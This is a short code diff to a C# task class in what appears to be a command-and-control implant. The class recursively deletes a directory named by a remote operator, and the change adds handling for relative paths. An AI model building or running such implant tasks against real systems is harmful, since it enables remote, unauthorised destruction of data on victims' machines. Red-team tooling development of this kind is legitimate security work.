@@ -13,6 +13,10 @@ namespace Implant.Tasks.Execute
         public override string Execute(ImplantTask task)
         {
             targetDir = task.Args;
+            var currentDir = Directory.GetCurrentDirectory();
+
+            if (!(targetDir.Contains(currentDir))) { targetDir = $"{currentDir}\\{task.Args}"; }
+
 
             DirectoryInfo dirData = new DirectoryInfo(targetDir);
 
@@ -21,7 +25,7 @@ namespace Implant.Tasks.Execute
             
             Directory.Delete(targetDir, true);
 
-            if(!(dirData.Exists)) { return $"[*] {targetDir} removed\n"; }
+            if (!(dirData.Exists)) { return $"[*] {targetDir} removed\n"; }
             return $"[-] Failed to remove {targetDir}\n";
         }
     }
